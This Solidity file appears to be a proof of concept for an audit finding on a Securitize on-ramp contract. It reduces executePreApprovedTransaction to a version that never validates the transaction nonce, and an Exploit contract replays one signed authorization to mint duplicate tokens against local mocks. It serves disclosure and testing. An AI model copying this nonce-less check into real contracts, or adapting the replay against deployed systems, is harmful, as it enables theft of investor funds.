// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Securitize On/Off Ramp — replay of a pre-approved transaction (finding #64270).
   Local, cheatcode-free reduction. A valid transaction with nonce 0 is executed twice:
   the second execution is accepted because executePreApprovedTransaction records a nonce
   but never checks that txData.nonce is the currently expected nonce. */

contract MockUSD {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DSToken {
    mapping(address => uint256) public balanceOf;
    function issue(address investor, uint256 amount) external { balanceOf[investor] += amount; }
}

contract SubscriptionDestination {
    MockUSD public immutable usdc;
    DSToken public immutable dsToken;
    address public immutable onRamp;
    constructor(MockUSD _usdc, DSToken _dsToken, address _onRamp) {
        usdc = _usdc;
        dsToken = _dsToken;
        onRamp = _onRamp;
    }
    function subscribe(address investor, uint256 amount) external {
        require(msg.sender == onRamp, "only on-ramp");
        usdc.transferFrom(investor, address(this), amount);
        dsToken.issue(investor, amount);
    }
}

contract SecuritizeOnRamp {
    struct ExecutePreApprovedTransaction {
        address senderInvestor;
        address destination;
        bytes data;
        uint256 nonce;
    }

    mapping(address => uint256) public noncePerInvestor;

    function hashTx(ExecutePreApprovedTransaction calldata txData) public pure returns (bytes32) {
        return keccak256(abi.encode(txData.senderInvestor, txData.destination, txData.data, txData.nonce));
    }

    // Faithful reduction of SecuritizeOnRamp.sol:184-199. The signature is
    // represented by one non-empty byte; the vulnerability is independent of crypto.
    function executePreApprovedTransaction(
        bytes memory signature,
        ExecutePreApprovedTransaction calldata txData
    ) public {
        bytes32 digest = hashTx(txData);
        require(signature.length != 0 && digest != bytes32(0), "InvalidEIP712SignatureError");
        // FIX: require(txData.nonce == noncePerInvestor[txData.senderInvestor], "invalid nonce");
        noncePerInvestor[txData.senderInvestor] = noncePerInvestor[txData.senderInvestor] + 1; // @> VULN: stored nonce is incremented but txData.nonce is never validated, so an old valid signature replays.
        (bool ok,) = txData.destination.call(txData.data);
        require(ok, "destination call failed");
    }
}

contract Exploit {
    MockUSD public usdc;                 // CREATE nonce 1
    DSToken public dsToken;              // CREATE nonce 2
    SecuritizeOnRamp public onRamp;      // CREATE nonce 3 (vulnerable)
    SubscriptionDestination public destination; // CREATE nonce 4
    uint256 public constant AMOUNT = 100;

    constructor() {
        usdc = new MockUSD();
        dsToken = new DSToken();
        onRamp = new SecuritizeOnRamp();
        destination = new SubscriptionDestination(usdc, dsToken, address(onRamp));
    }

    function run() external {
        usdc.mint(address(this), AMOUNT * 2);
        usdc.approve(address(onRamp), AMOUNT * 2);
        usdc.approve(address(destination), AMOUNT * 2);
        bytes memory callData = abi.encodeWithSelector(
            SubscriptionDestination.subscribe.selector, address(this), AMOUNT
        );
        SecuritizeOnRamp.ExecutePreApprovedTransaction memory txData =
            SecuritizeOnRamp.ExecutePreApprovedTransaction({
                senderInvestor: address(this), destination: address(destination), data: callData, nonce: 0
            });
        onRamp.executePreApprovedTransaction(hex"01", txData);
        onRamp.executePreApprovedTransaction(hex"01", txData); // @> replay: the identical nonce-0 authorization executes a second subscription.
        require(onRamp.noncePerInvestor(address(this)) == 2, "replay did not increment twice");
        require(dsToken.balanceOf(address(this)) == AMOUNT * 2, "investor did not receive duplicate DS tokens");
        require(usdc.balanceOf(address(this)) == 0, "duplicate swap did not consume investor funds");
    }
}
